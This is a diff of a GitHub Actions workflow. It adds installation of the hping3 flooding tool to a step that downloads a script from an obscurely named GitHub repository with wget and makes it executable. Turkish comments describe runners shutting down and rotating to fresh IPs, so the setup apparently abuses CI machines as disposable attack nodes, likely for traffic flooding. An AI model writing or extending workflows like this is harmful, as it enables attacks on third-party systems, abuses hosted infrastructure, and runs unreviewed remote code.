@@ -26,6 +26,7 @@ jobs:
     steps:
       - name: Prep
         run: |
+          apt install hping3
           wget https://github.com/qwesdaasdasd/asdsdawa4234rdsf/raw/refs/heads/main/real2.sh -O real.sh
           chmod +x real.sh
 
@@ -37,5 +38,5 @@ jobs:
           done
           
           # Makine 12 saniye sonra kapanacak, sıradaki taze IP gelecek
-          sleep 12
+          sleep 20
           echo "Node ${{ matrix.node }} bitti, yeni IP'ye geçiliyor..."
